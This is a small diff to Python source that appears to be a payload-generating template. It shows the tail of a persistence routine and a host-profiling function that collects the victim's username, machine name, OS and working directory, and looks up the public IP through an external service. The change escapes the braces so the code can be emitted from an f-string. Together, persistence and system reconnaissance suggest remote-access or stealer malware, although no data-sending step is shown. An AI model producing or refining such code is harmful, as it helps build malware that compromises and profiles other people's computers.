@@ -525,7 +525,7 @@ def persist():
         dprint(f"Persist error: {{e}}")
 
 def get_info():
-    info = {"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}
+    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}}
     try:
         info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
     except: pass
